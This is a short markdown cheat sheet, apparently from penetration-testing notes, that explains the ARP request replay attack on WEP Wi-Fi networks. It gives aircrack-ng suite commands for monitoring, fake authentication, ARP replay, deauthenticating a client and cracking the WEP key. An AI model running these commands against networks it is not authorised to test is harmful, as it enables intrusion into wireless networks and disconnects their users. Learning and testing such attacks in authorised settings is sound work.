# OWASP - ARP Request Replay Attack (WEP)

The classic ARP request replay attack is the most effective way to generate new initialization vectors (IVs), and works very reliably. The program listens for an ARP packet then retransmits it back to the access point. This, in turn, causes the access point to repeat the ARP packet with a new IV. The program retransmits the same ARP packet over and over. However, each ARP packet repeated by the access point has a new IVs. It is all these new IVs which allow you to determine the WEP key.

ARP is address resolution protocol: A TCP/IP protocol used to convert an IP address into a physical address, such as an Ethernet address. A host wishing to obtain a physical address broadcasts an ARP request onto the TCP/IP network. The host on the network that has the address in the request then replies with its physical hardware address.

## Commands

* Run [setup](../../setup.md) first
* Two terminals needed here, so use `screen` or log in twice
     * Make sure terminal is full screen
* Make sure that there is an associated client connected to target AP

```bash
# [Terminal One]
# Set interface to monitor mode
sudo airmon-ng start $DEVICE $CHANNEL

# Start monitoring
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE

# [Terminal Two]
# Run the fake authentication attack first
sudo aireplay-ng --fakeauth 0 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE

# Run the ARP replay attack
sudo aireplay-ng --arpreplay -b $BSSID -h $INTERFACEMAC $INTERFACE

# Run the deauthentication attack
sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT $INTERFACE

# Crack the WEP keister (ensure that plenty of IVs are captured beforehand)
sudo aircrack-ng $PCAP
```

## References

* [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
* [ARP Request Replay](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection)
* [REdBlueTeam](https://youtu.be/_9qJ1Urpn0Y?t=2615)
